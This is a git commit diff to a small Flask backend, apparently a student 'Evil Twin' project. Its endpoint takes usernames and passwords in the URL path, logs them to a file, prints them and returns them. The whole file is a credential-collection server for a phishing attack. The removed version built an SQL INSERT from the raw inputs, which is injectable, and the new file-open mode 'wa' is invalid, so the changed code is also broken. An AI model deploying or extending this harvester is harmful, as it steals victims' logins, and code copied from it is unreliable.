520e5432869cd6bc8ceb4c337c326c4e05fbde04
WayneJz <waynezjiang@gmail.com>
2019-04-12 15:25:27 +1000

    'frontend,backend'

--- project/hacker_backend.py
+++ project/hacker_backend.py
@@ -1,7 +1,5 @@
 from flask import Flask
 from flask_restplus import Resource, Api
-import sqlite3
-import os
 from flask_cors import CORS
 
 app = Flask(__name__)
@@ -9,45 +7,21 @@ CORS(app, supports_credentials=True)
 api = Api(app, title="Hacker", description="Hacker for Evil Twin. Zhou JIANG z5146092")
 
 
-def database_controller(command, database='hack.db'):
-    connection = sqlite3.connect(database)
-    cursor = connection.cursor()
-    cursor.execute(command)
-    result = cursor.fetchall()      # If multiple commands, no output will be fetched
-    connection.commit()
-    connection.close()
-    return result
-
-
-def create_db(db_file='hack.db'):
-    if os.path.exists(db_file):
-        print('Database already exists.')
-        return False
-    print('Creating database ...')
-    database_controller('CREATE TABLE Hacker ('
-                        'username VARCHAR(100),'
-                        'password VARCHAR(100)'
-                        ');'
-                        )
-    return True
-
-
 @api.route('/hack/<string:username>/<string:password>')
 class Hacker(Resource):
     def get(self, username, password):
-        database_controller(f"INSERT INTO Hacker VALUES "
-                            f"('{username}', '{password}');")
+        with open('hack.txt', 'wa') as hack_file_w:
+            print(f"Username: {username} Password: {password}", file=hack_file_w)
 
         print("Now the database has such values:")
-        select_result = database_controller("SELECT * FROM Hacker;")
-        for i in range(len(select_result)):
-            print(f"{i} Username: {select_result[i][0]} Password: {select_result[i][1]}")
+        with open('hack.txt', 'r') as hack_file_r:
+            for line in hack_file_r:
+                print(line)
 
         return {
-                "message": "Successfully stored hacker message"
+                "message": f"Successfully stored hacker message {username} {password}"
             }, 200
 
 
 if __name__ == "__main__":
-    create_db()
     app.run(host='127.0.0.1', port=9337, debug=True)
